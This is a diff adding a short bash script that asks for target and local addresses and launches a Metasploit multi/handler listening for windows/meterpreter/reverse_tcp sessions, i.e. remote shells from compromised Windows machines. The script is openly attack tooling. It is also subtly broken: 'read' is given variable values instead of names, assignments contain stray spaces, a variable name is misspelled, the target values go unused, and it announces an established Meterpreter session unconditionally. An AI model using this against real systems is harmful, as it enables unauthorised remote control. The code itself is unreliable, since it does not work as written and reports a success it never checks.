@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# Target IP and port
+echo "TARGET_IP"
+read $TARGET_IP
+echo "TARGET_PORT"
+read $Target_PORT
+echo "YOUR_LOCAL_IP"
+read $YOUR_LOCAL_IP
+echo "YOUR_LOCAL_PORT"
+read $YOUR_LOCAL_PORT
+target_ip= $TARGET_IP
+target_port= $TARGET_PORT
+
+# Payload options
+payload="windows/meterpreter/reverse_tcp"
+lhost= $YOUR_LOCAL_IP
+lport= $YOUR_LOCAL_PORT
+
+# Start Metasploit console
+msfconsole -q << EOF
+use exploit/multi/handler
+set PAYLOAD $payload
+set LHOST $lhost
+set LPORT $lport
+set ExitOnSession false
+exploit -j
+EOF
+
+echo "Meterpreter session established."
+
